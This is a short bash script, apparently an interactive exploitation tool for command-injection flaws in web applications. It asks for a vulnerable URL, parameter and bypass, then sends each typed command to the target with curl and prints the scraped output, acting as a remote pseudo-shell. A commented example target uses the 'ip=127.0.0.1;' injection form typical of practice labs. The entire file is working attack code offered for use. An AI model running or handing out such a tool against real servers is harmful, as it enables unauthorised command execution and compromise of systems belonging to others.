#!/bin/bash

#Color is happyness
RED="\033[01;31m"                                                                                
GREEN="\033[01;32m"                                                                              
YELLOW="\033[01;33m" 
red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`

read -p "Enter the vulnerable url: " url
read -p "Enter the vulnerable parameter: " param
read -p "Enter your bypass for command injection: " bypass


#url=http://vulnerable/commandexec/example3.php
#param="ip=127.0.0.1;"

echo -e "${green}Enter your command: "
while read cmd
do
   today=`date '+%m_%d'`;
   content=$(curl -s --get --data-urlencode "${param}${bypass}${cmd}" $url)
   echo -e $content > /tmp/$today-result.txt 
   result= echo -e ${red} ">>" && cat /tmp/$today-result.txt | grep -o -P '(?<=/0).*(?=<footer>)' | grep -o -P '(?<=ms).*(?=</pre>)'
   echo -e ${result};
   echo "${reset}__________________________________________________________________" ;
   echo -e "${green}Enter a command: ${YELLOW}"; 
   rm /tmp/$today-result.txt
done
